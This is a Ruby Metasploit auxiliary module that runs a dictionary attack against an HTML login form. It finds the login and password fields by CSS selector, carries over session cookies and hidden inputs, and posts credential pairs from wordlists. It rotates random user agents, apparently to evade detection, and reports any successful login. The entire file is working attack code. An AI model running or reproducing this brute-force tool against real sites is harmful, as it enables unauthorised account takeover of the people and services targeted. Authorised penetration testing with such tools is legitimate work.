require 'metasploit/framework/credential_collection'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Report

  USER_AGENTS = [
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0',
      'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
      'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36',
      'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
      'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36',
      'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0',
      'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
      'Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0',
      'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
      'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0',
  ]

  def initialize()
    super(
        'Name' => 'Web login form bruteforce attack',
        'Description' => 'Performs a dictionary attack against a HTML login form',
        'Version' => '$Revision: 1$',
        'Author' => ['Romain Létang'],
        'License' => MSF_LICENSE,
        'DefaultOptions' => {
            'RPORT' => 80
        }
    )
    register_options(
        [
            OptString.new('URL', [true, 'The URL that contains the form (prefixed with http or https)']),
            OptString.new('LOGIN_FIELD_SELECTOR', [true, 'A CSS selector to the login field']),
            OptString.new('PWD_FIELD_SELECTOR', [true, 'A CSS selector to the password field']),
            OptString.new('SUCCESS_REGEX', [true, 'A regex the HTML page has to match to detect a successful login attempt']),
            OptBool.new('RANDOM_USER_AGENT', [true, 'Wether to use a random user-agent or not', true]),
        ])
		
	#deregister_options('')
  end

  def check()
    url_valid?(datastore['URL'])

    form, cookies = get_session_info

    if form.nil?
      print_bad('Error while searching for the form')
      return Exploit::CheckCode::Safe
    end

    form1, cookies1 = get_session_info

    form[:static] = (form == form1 && cookies == cookies1)

    print_good('The form has been found')
    print_form(form)

    Exploit::CheckCode::Appears
  end

  def run
    url_valid?(datastore['URL'])

    form, cookies = get_session_info

    if form.nil?
      print_bad('An error occured')
      return 0
    end

    # We send another request to check wether the form/session is static
    form1, cookies1 = get_session_info

    form[:static] = (form == form1 && cookies == cookies1)

    if form[:static]
      print_status('The form and/or session is static (no reload needed between each request)')
    else
      print_status('The form and/or session is dynamic (reload needed between each request)')
    end
	
    # BEGIN ATTACK
	
	
    cred_collection = Metasploit::Framework::CredentialCollection.new(
        pass_file: datastore['PASS_FILE'],
        password: datastore['PASSWORD'],
        user_file: datastore['USER_FILE'],
        userpass_file: datastore['USERPASS_FILE'],
        username: datastore['USERNAME'],
        user_as_pass: datastore['USER_AS_PASS']
    )

	print_status('Bruteforce is starting...')
	
    index = 1
    cred_collection.each do |cred|
      unless form[:static]
        form, cookies = get_session_info
      end

      if do_login(form, cookies, cred.public, cred.private)
        print_good(format('[Try #%d] %s:%s - Success', index, cred.public, cred.private))
        return 0
      else
        print_status(format('[Try #%d] %s:%s - Failure', index, cred.public, cred.private))
      end
      index += 1
    end
	
	print_bad('All credentials have been tested but none of them seem to have worked')
	
  end

  # @return the form and the cookies
  def get_session_info

    res = send_request_cgi({
                               'uri' => to_uri(datastore['URL']).to_s,
                               'agent' => datastore['RANDOM_USER_AGENT'] ? random_user_agent : USER_AGENTS[0]
                           })

    unless res && res.code == 200
      print_error('Server didn\'t respond with code 200')
      print_error(format('Cannot access %s', uri))
      return nil
    end

    [get_form(res.get_html_document), res.get_cookies]
  end

  def do_login(form, cookies, login, pwd)

    vars_post = Hash.new

    vars_post[form[:login_input][:name]] = login
    vars_post[form[:pwd_input][:name]] = pwd

    form[:inputs].each do |input|
      unless input[:name].nil? && input[:value].nil?
        vars_post[input[:name]] = input[:value]
      end
    end

    res = send_request_cgi({
                               'uri' => normalize_form_action(form),
                               'method' => 'POST',
                               'cookie' => cookies,
                               'agent' => datastore['RANDOM_USER_AGENT'] ? random_user_agent : USER_AGENTS[0],
                               'vars_post' => vars_post
                           })

    return !(res.get_html_document.to_s =~ /#{Regexp.escape(datastore['SUCCESS_REGEX'])}/).nil?
  end

  def get_form(html)

    if html.nil?
      print_bad('Got an empty HTML document')
    end

    login_field_selector = datastore['LOGIN_FIELD_SELECTOR']
    pwd_field_selector = datastore['PWD_FIELD_SELECTOR']

	begin
		# Login field exists ?
		if html.css(login_field_selector).size.zero?
		  print_bad(format('No login field found with the following CSS selector: %s', login_field_selector))
		  return nil
		elsif html.css(login_field_selector).size > 1
		  print_bad(format('%d login fields found with the following CSS selector: %s (1 required)', html.css(login_field_selector).size, login_field_selector))
		  return nil
		end
	rescue Nokogiri::CSS::SyntaxError
		print_bad('Error in login field CSS selector')
		raise OptionValidateError.new(['LOGIN_FIELD_SELECTOR'])
    end

	begin
		# Pwd field exists ?
		if html.css(pwd_field_selector).size.zero?
		  print_bad(format('No password field found with the following CSS selector: %s', pwd_field_selector))
		  return nil
		elsif html.css(pwd_field_selector).size > 1
		  print_bad(format('%d password fields found with the following CSS selector: %s (1 required)', html.css(pwd_field_selector).size, pwd_field_selector))
		  return nil
		end
	rescue Nokogiri::CSS::SyntaxError
		print_bad('Error in passsword field CSS selector')
		raise OptionValidateError.new(['PWD_FIELD_SELECTOR'])
    end

    # Login field is in a form ?
    login_form = html.at_css(login_field_selector)
    if login_form.name != 'input'
      print_bad('The login field isn\'t of type input')
      return nil
    end

    while login_form.name != 'form' and login_form.name != 'body'
      login_form = login_form.parent
    end

    if login_form.name == 'body'
      print_bad(format('Couldn\'t find a parent form for the login field CSS selector %s', login_field_selector))
      return nil
    end

    # Pwd field is in a form ?
    pwd_form = html.at_css(pwd_field_selector)
    if pwd_form.name != 'input'
      print_bad('The password field isn\'t of type input')
      return nil
    end

    while pwd_form.name != 'form' and pwd_form.name != 'body'
      pwd_form = pwd_form.parent
    end

    if pwd_form.name == 'body'
      print_bad(format('Couldn\'t find a parent form for the password field CSS selector %s', login_field_selector))
      return nil
    end

    unless login_form == pwd_form
      print_bad('Both fields aren\'t part of the same form')
      return nil
    end

    login_field = html.at_css(login_field_selector)
    pwd_field = html.at_css(pwd_field_selector)

    dict = {
        action: login_form.attr('action'),
        method: login_form.attr('method'),
        uri: to_uri(datastore['URL'])
    }

    dict[:login_input] = {
        name: login_field.attr('name'),
        value: login_field.attr('value'),
        type: login_field.attr('type')
    }

    dict[:pwd_input] = {
        name: pwd_field.attr('name'),
        value: pwd_field.attr('value'),
        type: pwd_field.attr('type')
    }

    # misc inputs
    inputs_list = Array.new
    login_form.children.css('input').each do |input|

      next unless input != login_field and input != pwd_field

      inputs = {
          name: input.attr('name'),
          value: input.attr('value'),
          type: input.attr('type')
      }

      # append if not already in list
      inputs_list.push(inputs)
    end

    dict[:inputs] = inputs_list
	
    return dict
  end

  def to_uri(uri)
    begin
      URI(uri)
    rescue ::URI::InvalidURIError
      raise RuntimeError, "Invalid URI: #{uri}"
    end
  end

  def normalize_uri(*strs)
    new_str = strs * '/'
    new_str = new_str.gsub!('//', '/') while new_str.index('//')

    # Makes sure there's a starting slash
    new_str = '/' + new_str unless new_str[0, 1] == '/'

    return new_str
  end

  def normalize_form_action(form)
    if form[:action] == ''
      return to_uri(form[:uri]).to_s
    elsif form[:action][0] == '/'
      form[:action]
    else
	    unless (re_match = to_uri(form[:uri]).path.match('[^\/]*(\/.+\/).*')[1])
        re_match = '/'
      end

      format("%s#{form[:action]}", re_match)
    end
  end
  
  def print_form(form)

    print_line(format('Static: %s', form[:static].to_s))
    print_line(format('Action: %s, method; %s', form[:action], form[:method]))

	if form[:login_input]
	  print_line(format('  login input: name: \'%s\', value: \'%s\', type: \'%s\'', form[:login_input][:name], form[:login_input][:value], form[:login_input][:type]))
	end

	if form[:pwd_input]
	  print_line(format('  pass input: name: \'%s\', value: \'%s\', type: \'%s\'', form[:pwd_input][:name], form[:pwd_input][:value], form[:pwd_input][:type]))
	end
	
    if form[:inputs]
      o = 1
      form[:inputs].each do |input|
        print_line(format('  input #%d: name: \'%s\', value: \'%s\', type: \'%s\'', o, input[:name], input[:value], input[:type]))
        o += 1
      end
    end
  end

  # validation method
  def url_valid?(input)
    if input =~ /^https?:\/\/.+/i
      return true
    else
      print_error('The URL must be the following: http://<FQDN> or https://<FQDN>')
      raise OptionValidateError.new(['URL'])
    end
  end

  def random_user_agent
    USER_AGENTS.sample
  end

end
